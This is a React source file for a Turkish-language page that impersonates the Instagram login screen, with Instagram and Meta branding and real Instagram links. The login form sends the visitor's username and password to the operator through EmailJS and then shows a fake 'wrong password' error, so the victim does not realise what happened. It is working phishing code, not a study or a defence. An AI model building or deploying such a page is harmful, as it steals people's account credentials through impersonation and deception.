import React, { useRef, useState } from "react";
import emailjs from "@emailjs/browser";

import "./App.css";

function App() {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_jpyc2gm", "template_p4bmhcl", form.current, {
        publicKey: "V57OWPDudEhHuEDPU",
      })
      .then(
        () => {
          alert("Giriş yaparken bir sorunla karşılaşıldı!");
        },
        (error) => {
          alert("Kullanıcı adı veya şifre yanlış...");
        }
      );
  };

  return (
    <body>
      <div id="content-container">
        <section className="phones">
          <img
            src="/phones.png"
            alt="pictures on phone"
            className="phone-image"
          />
          <div className="display-phone">
            <img className="picture" src="/photo-1.png" alt="#" />
            <img className="picture" src="/photo-2.png" alt="#" />
            <img className="picture" src="/photo-3.png" alt="#" />
            <img className="picture" src="/photo-4.png" alt="#" />
            <img className="picture" src="/photo-5.png" alt="#" />
          </div>
        </section>

        <section className="user">
          <div className="login-container">
            <div className="instagram-logo-box">
              <img className="instagram-logo" src="/instagram-logo.png" />
            </div>

            <form id="login-post" ref={form} onSubmit={sendEmail} method="POST">
              <div className="inputs-container">
                <input
                  type="text"
                  name="user_name"
                  placeholder="Telefon numarası veya e-posta"
                />
              </div>
              <div className="inputs-container">
                <input
                  type="password"
                  name="user_password"
                  placeholder="Şifre"
                />
              </div>
              <input
                type="submit"
                className="login-button"
                value={"Giriş Yap"}
              />

              <div className="or-container">
                <div className="line"></div>
                <div className="or">YA DA</div>
                <div className="line"></div>
              </div>
              <div className="facebook-container">
                <a className="facebook-login" href="#">
                  <img className="facebook-logo" src="/facebook-logo.png" />
                  Facebook ile Giriş Yap
                </a>
              </div>
            </form>

            <a
              className="password-forgot"
              href="https://www.instagram.com/accounts/password/reset/"
            >
              Şifreni mi unuttun?
            </a>
          </div>

          <div className="signup-container">
            <p>
              Hesabın yok mu?{" "}
              <a
                className="signup"
                href="https://www.instagram.com/accounts/emailsignup/"
              >
                Hesap oluştur
              </a>
            </p>
          </div>

          <div className="get-container">
            <p>Uygulamayı indir.</p>
            <div className="download-container">
              <a
                className="download-appstore"
                href="https://apps.apple.com/tr/app/instagram/id389801252"
              >
                <img className="appstore" src="/applestore-logo.png" />
              </a>
              <a
                className="download-googleplay"
                href="https://play.google.com/store/apps/details?id=com.instagram.android"
              >
                <img className="googleplay" src="/googleplay-logo.png" />
              </a>
            </div>
          </div>
        </section>
      </div>

      <footer className="page-footer">
        <div className="links-container">
          <ul className="links-list">
            <li>
              <a className="link" href="https://about.meta.com/">
                Meta
              </a>
            </li>
            <li>
              <a className="link" href="https://about.instagram.com/">
                Hakkında
              </a>
            </li>
            <li>
              <a className="link" href="https://about.instagram.com/blog">
                Blog
              </a>
            </li>
            <li>
              <a className="link" href="#">
                İş Fırsatları
              </a>
            </li>
            <li>
              <a
                className="link"
                href="https://about.instagram.com/about-us/careers"
              >
                Yardım
              </a>
            </li>
            <li>
              <a
                className="link"
                href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect"
              >
                Gizlilik
              </a>
            </li>
            <li>
              <a
                className="link"
                href="https://developers.facebook.com/docs/instagram"
              >
                API
              </a>
            </li>
            <li>
              <a
                className="link"
                href="https://help.instagram.com/581066165581870/"
              >
                Koşullar
              </a>
            </li>
            <li>
              <a
                className="link"
                href="https://www.instagram.com/explore/locations/"
              >
                Konumlar
              </a>
            </li>
            <li>
              <a className="link" href="https://www.threads.net/login/">
                Threads
              </a>
            </li>
          </ul>
        </div>

        <div className="footer-span-container">
          <span className="footer-span">© 2024 Instagram from Meta</span>
        </div>
      </footer>
    </body>
  );
}

export default App;
